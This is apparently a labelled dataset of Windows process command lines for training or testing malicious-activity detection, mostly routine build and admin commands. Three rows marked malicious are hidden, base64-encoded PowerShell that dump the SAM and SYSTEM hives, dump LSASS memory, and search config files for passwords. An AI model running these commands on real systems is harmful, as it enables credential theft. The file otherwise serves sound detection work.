process_name,command_line,label
tasklist.exe,tasklist /fo table,benign
dotnet.exe,dotnet build platform.sln -c Release,benign
git.exe,git status,benign
net.exe,net use Z: \\fileserver\share,benign
nuget.exe,nuget restore data-pipeline.sln,benign
sqlcmd.exe,"sqlcmd -S db -d worker -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
systeminfo.exe,systeminfo,benign
powershell.exe,Get-ChildItem C:\Users\backupadmin\Documents,benign
dotnet.exe,dotnet test,benign
docker.exe,docker build -t auth-svc:42 .,benign
powershell.exe,powershell -nop -w hidden -enc cgBlAGcAIABzAGEAdgBlACAASABLAEwATQBcAFMAQQBNACAAJQBUAEUATQBQACUAXABzAGEAbQAgACYAJgAgAHIAZQBnACAAcwBhAHYAZQAgAEgASwBMAE0AXABTAFkAUwBUAEUATQAgACUAVABFAE0AUAAlAFwAcwB5AHMA,malicious
sc.exe,sc query api-gateway,benign
powershell.exe,powershell -nop -w hidden -enc cgB1AG4AZABsAGwAMwAyACAAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABNAGkAbgBpAEQAdQBtAHAAIAAoAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAGwAcwBhAHMAcwApAC4ASQBkACAAJQBUAEUATQBQACUAXABsAC4AZABtAHAAIABmAHUAbABsAA==,malicious
powershell.exe,Restart-Service -Name nginx,benign
powershell.exe,Test-Connection -Count 2 db-11,benign
powershell.exe,Get-Service | Where-Object Status -eq Running,benign
powershell.exe,Get-EventLog -LogName Application -Newest 20,benign
nuget.exe,nuget restore infra.sln,benign
ipconfig.exe,ipconfig /all,benign
sqlcmd.exe,"sqlcmd -S db -d redis -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
choco.exe,choco install nodejs -y,benign
docker.exe,docker build -t auth-svc:94 .,benign
msbuild.exe,msbuild /t:Rebuild /p:Configuration=Release,benign
where.exe,where python,benign
git.exe,git pull origin main,benign
choco.exe,choco install git-lfs -y,benign
powershell.exe,powershell -nop -w hidden -enc ZgBpAG4AZABzAHQAcgAgAC8AUwAgAC8ASQAgAC8ATQAgACIAcABhAHMAcwB3AG8AcgBkACIAIABDADoAXABpAG4AZQB0AHAAdQBiAFwAKgAuAGMAbwBuAGYAaQBnAA==,malicious
docker.exe,docker build -t search:19 .,benign
curl.exe,curl.exe -s http://localhost:5000/health,benign
sqlcmd.exe,"sqlcmd -S db -d nginx -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
